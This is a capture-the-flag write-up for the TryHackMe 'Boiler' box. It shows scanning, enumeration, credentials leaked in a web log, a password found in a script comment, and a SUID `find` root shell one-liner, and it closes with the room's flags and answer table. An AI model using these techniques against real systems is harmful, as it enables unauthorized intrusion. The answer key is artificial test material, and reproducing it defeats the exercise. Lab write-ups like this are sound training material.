# TryHackMe — Boiler CTF

## Overview
Boot-to-root CTF box: anonymous FTP (troll file) → Joomla CMS with sar2HTML in a subdirectory → leaked SSH credentials in a log file → password for second user hidden in a backup script comment → SUID `find` binary for root privesc.

## Recon

### Nmap
```
nmap -sS -T4 --open -Pn -p- --min-rate 1000 <target-ip>
nmap -sS -T4 --open -Pn -sV -sC -p 21,80,10000,55007 <target-ip>
```

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |
| 10000/tcp | http | MiniServ 1.930 (Webmin) |
| 55007/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

### FTP — anonymous login (red herring)
```
ftp <target-ip>
# anonymous / no password
passive
get .info.txt
```

Contents (ROT13): `Just wanted to see if you find it. Lol. Remember: Enumeration is the key!` — a troll, not a lead.

### Web enumeration — Joomla CMS
```
gobuster dir -u http://<target-ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30 -x html,txt
```

Found `/joomla/` with several interesting subdirectories:
- `/joomla/administrator` — Joomla admin panel
- `/joomla/_test` — **sar2HTML** application (the real attack surface)
- `/joomla/_database` — another troll page (Caesar cipher: "Just messing around")
- `/joomla/_archive`, `/joomla/_files` — empty/irrelevant

### sar2HTML — leaked credentials

Browsing `/joomla/_test/` revealed a sar2HTML instance. Found a log file:
```
curl -s http://<target-ip>/joomla/_test/log.txt
```

Output contained SSH auth logs with **plaintext credentials**:
```
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
```

**Credentials:** `basterd` / `superduperp@$$`

## Foothold — SSH as basterd

```
ssh basterd@<target-ip> -p 55007
# password: superduperp@$$
```

Home directory contained one file:
```
ls -la
# -rwxr-xr-x 1 stoner basterd 699 Aug 21  2019 backup.sh
```

## Lateral Movement — basterd → stoner

Examining `backup.sh` revealed a commented-out password for user `stoner`:
```
USER=stoner
#superduperp@$$no1knows
```

Switched user:
```
su stoner
# password: superduperp@$$no1knows
```

**user.txt** (in `/home/stoner/.secret`): `You made it till here, well done.`

## Privilege Escalation — SUID find

Checked for SUID binaries:
```
find / -perm -4000 2>/dev/null
```

`/usr/bin/find` had the SUID bit set — classic GTFOBins privesc:
```
find . -exec /bin/bash -p \;
```

Root shell obtained.

**root.txt:** `It wasn't that hard, was it?`

## THM Answers

| Question | Answer |
|----------|--------|
| File extension after anon login | txt |
| What is on the highest port? | ssh |
| What's running on port 10000? | webmin |
| Can you exploit the service running on that port? | nay |
| What CMS can you access? | Joomla |
| The interesting file name in the folder? | log.txt |
| Where was the other users pass stored (no extension)? | backup |
| user.txt | You made it till here, well done. |
| What did you exploit to get the privileged user? | find |
| root.txt | It wasn't that hard, was it? |

## Key Takeaways

- Multiple red herrings (ROT13 FTP note, Caesar cipher page, Webmin that can't be exploited) — don't get sidetracked; keep enumerating.
- Always check log files exposed on web applications — they can leak credentials in plaintext.
- Script comments are a common hiding spot for passwords in CTFs — always `cat` every script you find.
- SUID `find` is a well-known GTFOBins privesc vector: `find . -exec /bin/bash -p \;` gives a root shell instantly.
- SSH on non-standard ports (55007) is easy to miss if you don't do a full port scan.
